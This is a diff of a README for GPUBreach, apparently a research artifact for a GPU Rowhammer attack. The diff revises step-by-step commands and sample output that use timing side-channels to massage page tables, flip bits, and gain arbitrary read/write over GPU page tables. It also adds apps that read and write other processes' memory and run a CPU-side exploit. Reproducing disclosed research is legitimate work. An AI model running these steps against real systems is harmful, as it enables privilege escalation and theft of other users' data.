@@ -11,8 +11,9 @@
 
 ├── 📄 CMakeList.txt
 ├── 📄 gpubreach_main.cu: main function to run different steps of GPUBreach.
-├── 📄 app_demo.cu: Run GPUBreach, which will try to read and write another process's data.
-├── 📄 app_cpu_exploit.cu: GPUBreach program used to perform CPU-side exploit.
+├── 📄 app_demo.cu: Part of the GPUBreach demo program, which will try to read and write another process's data.
+├── 📄 app_cpu_exploit.cu: GPUBreach program used to modify cpu-exploit pointer to IOVA region
+├── 📄 app_transfercu: GPUBreach program used to transfer arbitrary rw to another process.
 ├── 📄 s1_allocallmem.*: Step 1 of GPUBreach, using UVM timing side-channel to get system memory limit.
 |
 ├── 📄 s2_firstRegion.*: Step 2 of GPUBreach, using UVM timing side-channel and 4KB page tables to massage PT regions to flippy locations.
@@ -22,7 +23,7 @@
 └── 📄 s4_secondRegion.*: Step 4 of GPUBreach, same as sc_firstRegion.
 ```
 
-### Step 0. Compile
+### Step 0.1 Compile
 ```bash
 cmake -S ./src -B ./src/out/
 cd ./src/out/
@@ -36,11 +37,20 @@ python3 gpubreach.py -h
 python3 gpubreach.py <task> -h
 ```
 
+### Step 0.2 Bit-flip Configuration File
+
+Before the attack can succeed, you need to find a suitable bit-flip on your machine. You can use the `gpuahammer/` we provided, or other attack patterns from your own directories for the search. Make sure they still follow the same structure and modify `HAMMER_ROOT` to point to your own directory instead.
+
+__Configuratio File__: For ease of use, we provide the feature of _bit-flip configuration files_, for both "A1" and "B1" flips, covering the cases where the aggressor is on the left or right of the victim page. They are very similar to how you initialize GPUHammer's bash scripts.
+
+
+Please view the sample config files in `flip_config_sample\` folder on how to construct your own, which we provided comprehensive comments. If necessary, `load_rowhammer_bitflip_info()` contains more details on how they are used exactly.
+
 ### Step 1. Fill GPU Memory
 We recommend enabling the verbose option `-v` when testing. Given different GPUs may have different timing, we run the following to get a sense of the timing spike:
 
 ```bash
-python3 gpubreach.py all_mem_test -t 0.2 -s 15 -v
+python3 gpubreach.py all_mem_test -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 
 where `-t 0.2` is means a threshold of 0.2ms, which we classify any time above this **threshold** as a timing spike, and `15` is how many initial measurements to **skip**, given usually the first few measurements take longer when GPU is warming up.
@@ -62,7 +72,7 @@ If not, inspect the output of the time to observe **consecutive timing spikes** 
 
 You can then run this command to control the number of allocations, which is what the future steps will use.
 ```bash
-python3 gpubreach.py all_mem --n_step1 24109 -t 0.2 -s 15 -v
+python3 gpubreach.py all_mem --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 The output should stop at 24108, as this is the maximum memory before any evictions. If you increase `--n_step1`, you should expect to see the same behavior as before.
 
@@ -70,7 +80,7 @@ The output should stop at 24108, as this is the maximum memory before any evicti
 Taking the number we found from **Step 1**, we use it to perform the massaging step. We will test that the timing side-channel with 4KB pages works as intended by running the test command below:
 
 ```bash
-python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -v
+python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 
 The final output should not be longer than 1024 (but around 800-900 ish), as we generate PT regions very fast. If it is going longer, your **threshold** may be too high, lower it or see below how it is supposed to behave:
@@ -94,7 +104,7 @@ There are no direct way to verify whether the massaging worked directly after th
 
 Run the following to see how it will look like in the complete pipeline:
 ```bash
-BREACH_DEBUG=1 ./sc_main first_region 24184 0.2 15
+python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 
 Should look like this:
@@ -106,30 +116,10 @@ Should look like this:
 
 ### Step 3: 
 
-Once you believe (or verified) the massaging is working as intended, we now will move to filling the PT region with PTEs and hammer it. The current program simply fills the PT region adhocly by filling the entire memory again as we will need this anyway in **Step 4** (but with 64KB pages instead of 2MB). 
-
-To get the new memory limit after our massaging/**Step 2**, run this command and follow the same procedure as **Step 1**, and tune the **threshold** if needed. 
-```bash
-python3 gpubreach.py first_region_atk_mem_test --n_step1 24109 -t 0.2 -s 15 -v
-```
-It should be a slightly lower number than **Step 1**, and run multiple times if needed to verify that this occurs consistently:
-```txt
-24068 New PT time: 0.078081 0x7fafa8c00000 ms
-24069 New PT time: 0.077109 0x7fafa8e00000 ms
-24070 New PT time: 1.1084 0x7fafa9000000 ms
-24071 New PT time: 1.05451 0x7fafa9200000 ms
-24072 New PT time: 1.0424 0x7fafa9400000 ms
-24073 New PT time: 0.992982 0x7fafa9600000 ms
-24074 New PT time: 0.897697 0x7fafa9800000 ms
-Spikes observed after allocation index 24070
-This means you should perform at most 24070 number of allocations to avoid eviction
-Pass 24070 as the limit in subsequent experiments.
-```
-
-Now we can see whether our attack really worked:
+Once you believe (or verified) the massaging is working as intended, we now will move to filling the PT region with PTEs and hammer it. see whether our attack really worked:
 
 ```bash
-python3 gpubreach.py first_region_atk --n_step1 24109 --n_step3 24070 -t 0.2 -s 15 -v
+python3 gpubreach.py first_region_atk --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 
 You should usually get it first try on our machine.
@@ -149,10 +139,10 @@ Found victim id.
 This step does the same thing as **Step 2** and completes the exploit.
 
 ```bash
-python3 gpubreach.py second_region --n_step1 24109 --n_step3 24070 -t 0.2 -s 15 -v
+python3 gpubreach.py second_region --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
 ```
 
-It will print out a bunch of PTEs of 2MB cudaMalloced memories, which isn't available for normal users, showing that we have access to modify them. It also outputs the elapsed time, but given the verbose output and also that, the driver we provide is modified in order to provide helpful information in reviewing and executing the exploits, take the elapsed time as a grain of salt.
+It will also print out a bunch of PTEs of 2MB cudaMalloced memories, which isn't available for normal users, showing that we have access to modify them.
 
 ```txt
 4f90: 1 0 e6 5 0 0 0 6 
@@ -161,10 +151,25 @@ It will print out a bunch of PTEs of 2MB cudaMalloced memories, which isn't avai
 (Step 4 Success) Second PT Region Now in Attacker Controlled Region. We printed out the PTEs of the controlled page and provided relevant pointers to interact with them in struct S4_ExploitComplete.
 Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' means they are the 4KB PTEs.
 Press Enter Key to continue...
-
-Elapsed time: 31.7281 seconds
 ```
 
-## Section 6 Exploits w/ GPUBreach
+### Demo/CPU-exploit APP:
+
+To run these two application, the commands are very similar.
+```bash
+# Demo
+python3 gpubreach.py app_demo --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"
+
+# CPU-exploit
+python3 gpubreach.py app_cpu_exploit --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"
+```
+
+### Transfer APP:
+
+To transfer arbitrary RW to another process, you can use this command and relace `<non-blocking program>` with a non-blocking program (e.g. with nohup), or you may modify app_transfer to be similar to the behavior of CPU-exploit, where you manually start up programs. The requirement for the program is just you place 0x646464... in the arbitrary RW pointer you want, and 0x464646... to the page table pointer that you want to use to modify mapping. See `data_scripts/ml_exploit/torch_attacker.cu` and `data_scripts/cupqc_exploit/attacker_dumper.cu` as example.
+```bash
+# Demo
+python3 gpubreach.py app_transfer --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -a "<non-blocking program>"
+```
 
 
